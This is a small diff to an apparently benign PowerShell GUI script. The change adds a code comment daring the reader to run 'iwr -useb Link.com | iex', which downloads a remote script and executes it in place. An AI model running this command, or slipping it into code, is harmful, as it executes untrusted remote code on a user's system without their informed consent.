@@ -1,4 +1,4 @@
-Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Windows.Forms # run iwr -useb Link.com | iex i dare you
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
 $ErrorActionPreference = 'SilentlyContinue'
